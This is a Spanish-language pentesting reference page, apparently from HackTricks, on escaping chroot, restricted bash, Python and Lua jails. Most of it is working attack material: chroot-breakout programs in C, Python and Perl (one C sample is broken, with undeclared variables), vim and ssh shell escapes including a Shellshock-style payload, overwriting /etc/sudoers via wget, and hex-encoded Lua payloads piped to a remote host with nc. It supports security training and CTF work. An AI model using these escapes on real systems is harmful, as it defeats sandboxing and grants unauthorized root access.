# Escapando de Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Busca en** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **si puedes ejecutar algún binario con la propiedad "Shell"**

## Escapes de Chroot

De [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): El mecanismo chroot **no está destinado a defenderse** contra manipulaciones intencionales por parte de **usuarios privilegiados** (**root**). En la mayoría de los sistemas, los contextos chroot no se apilan correctamente y los programas chrooted **con suficientes privilegios pueden realizar un segundo chroot para escapar**.\
Generalmente, esto significa que para escapar necesitas ser root dentro del chroot.

> [!TIP]
> La **herramienta** [**chw00t**](https://github.com/earthquake/chw00t) fue creada para abusar de los siguientes escenarios y escapar de `chroot`.

### Root + CWD

> [!WARNING]
> Si eres **root** dentro de un chroot **puedes escapar** creando **otro chroot**. Esto se debe a que 2 chroots no pueden coexistir (en Linux), así que si creas una carpeta y luego **creas un nuevo chroot** en esa nueva carpeta siendo **tú fuera de ella**, ahora estarás **fuera del nuevo chroot** y, por lo tanto, estarás en el FS.
>
> Esto ocurre porque generalmente chroot NO mueve tu directorio de trabajo al indicado, así que puedes crear un chroot pero estar fuera de él.

Generalmente no encontrarás el binario `chroot` dentro de una cárcel chroot, pero **podrías compilar, subir y ejecutar** un binario:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + fd guardado

> [!WARNING]
> Esto es similar al caso anterior, pero en este caso el **atacante almacena un descriptor de archivo en el directorio actual** y luego **crea el chroot en una nueva carpeta**. Finalmente, como tiene **acceso** a ese **FD** **fuera** del chroot, accede a él y **escapa**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD puede ser pasado a través de Unix Domain Sockets, así que:
>
> - Crea un proceso hijo (fork)
> - Crea UDS para que el padre y el hijo puedan comunicarse
> - Ejecuta chroot en el proceso hijo en una carpeta diferente
> - En el proceso padre, crea un FD de una carpeta que esté fuera del nuevo chroot del proceso hijo
> - Pasa ese FD al proceso hijo usando el UDS
> - El proceso hijo cambia de directorio a ese FD, y debido a que está fuera de su chroot, escapará de la cárcel

### Root + Mount

> [!WARNING]
>
> - Montando el dispositivo raíz (/) en un directorio dentro del chroot
> - Chrooteando en ese directorio
>
> Esto es posible en Linux

### Root + /proc

> [!WARNING]
>
> - Montar procfs en un directorio dentro del chroot (si aún no lo está)
> - Busca un pid que tenga una entrada de root/cwd diferente, como: /proc/1/root
> - Chroot en esa entrada

### Root(?) + Fork

> [!WARNING]
>
> - Crea un Fork (proceso hijo) y chroot en una carpeta diferente más profunda en el FS y CD en ella
> - Desde el proceso padre, mueve la carpeta donde se encuentra el proceso hijo a una carpeta anterior al chroot de los hijos
> - Este proceso hijo se encontrará fuera del chroot

### ptrace

> [!WARNING]
>
> - Hace tiempo, los usuarios podían depurar sus propios procesos desde un proceso de sí mismos... pero esto ya no es posible por defecto
> - De todos modos, si es posible, podrías ptrace en un proceso y ejecutar un shellcode dentro de él ([ver este ejemplo](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Obtén información sobre la cárcel:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Modificar PATH

Verifica si puedes modificar la variable de entorno PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Usando vim
```bash
:set shell=/bin/sh
:shell
```
### Crear script

Verifica si puedes crear un archivo ejecutable con _/bin/bash_ como contenido
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obtener bash desde SSH

Si estás accediendo a través de ssh, puedes usar este truco para ejecutar un shell bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Declarar
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Puedes sobrescribir, por ejemplo, el archivo sudoers.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Otros trucos

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells**](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/**](https/gtfobins.github.io)\
**También podría ser interesante la página:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Trucos sobre cómo escapar de los python jails en la siguiente página:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

En esta página puedes encontrar las funciones globales a las que tienes acceso dentro de lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval con ejecución de comandos:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Algunos trucos para **llamar funciones de una biblioteca sin usar puntos**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Enumerar funciones de una biblioteca:
```bash
for k,v in pairs(string) do print(k,v) end
```
Ten en cuenta que cada vez que ejecutas la línea de comando anterior en un **entorno lua diferente, el orden de las funciones cambia**. Por lo tanto, si necesitas ejecutar una función específica, puedes realizar un ataque de fuerza bruta cargando diferentes entornos lua y llamando a la primera función de la biblioteca:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obtener una shell lua interactiva**: Si estás dentro de una shell lua limitada, puedes obtener una nueva shell lua (y con suerte ilimitada) llamando:
```bash
debug.debug()
```
## Referencias

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Diapositivas: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))

{{#include ../../banners/hacktricks-training.md}}
